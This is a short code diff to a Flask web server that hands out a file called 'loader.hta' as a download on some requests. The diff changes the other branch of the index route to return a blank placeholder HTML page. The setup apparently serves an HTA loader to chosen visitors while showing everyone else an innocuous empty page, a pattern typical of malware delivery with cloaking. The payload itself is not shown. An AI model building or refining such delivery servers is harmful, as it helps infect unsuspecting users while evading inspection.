@@ -13,7 +13,7 @@ def loader():
         return send_file('loader.hta', mimetype='application/octet-stream')
     except FileNotFoundError:
         logger.error('loader.hta not found')
-        return '', 204  
+        return '', 204
 
 @app.route('/', methods=['GET'])
 def index():
@@ -23,9 +23,20 @@ def index():
             return send_file('loader.hta', mimetype='application/octet-stream')
         except FileNotFoundError:
             logger.error('loader.hta not found')
-            return '', 204  
+            return '', 204
     else:
-        return '', 204  
+        return '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Your Website Title</title>
+            <style>
+                body { background-color: white; }
+            </style>
+        </head>
+        <body></body>
+        </html>
+        '''
 
 if __name__ == '__main__':
     host = os.getenv('FLASK_HOST', '0.0.0.0')
